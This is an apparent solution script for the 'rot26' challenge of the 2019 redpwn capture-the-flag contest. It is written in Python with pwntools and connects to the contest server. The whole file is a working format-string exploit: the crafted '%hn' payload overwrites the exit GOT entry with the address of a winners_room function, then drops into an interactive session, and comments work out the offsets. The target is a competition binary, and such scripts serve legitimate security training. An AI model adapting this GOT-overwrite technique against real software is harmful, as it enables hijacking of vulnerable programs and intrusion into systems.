from pwn import *

ip = "chall.2019.redpwn.net"
port = 4003
r = remote(ip,port)

# elf = 'rot26' 
# r = process("./"+elf)

context.arch = 'i386'

offset = 7
exit_got = 0x0804a020
# 0x80484a0 <exit@plt>:	0xa02025ff
winners_got = 0x08048737
#0x804 8737 <winners_room>:	0x53e5 8955
#0x8737 = 34615
#0x804 = 2052
# 32563
#exploit = "%19$p".ljust( 0x30 , 'a' )+p32(0xdeadbeef)
exploit = "%2052c%19$hn%32563c%20$hn".ljust( 0x30 , '\x00' )+p32(exit_got+2)+p32(exit_got)
# 0x30 = 48 
# 32bit => 48/4= 12  7+12=19

raw_input("aa")
r.send(exploit)
r.interactive()
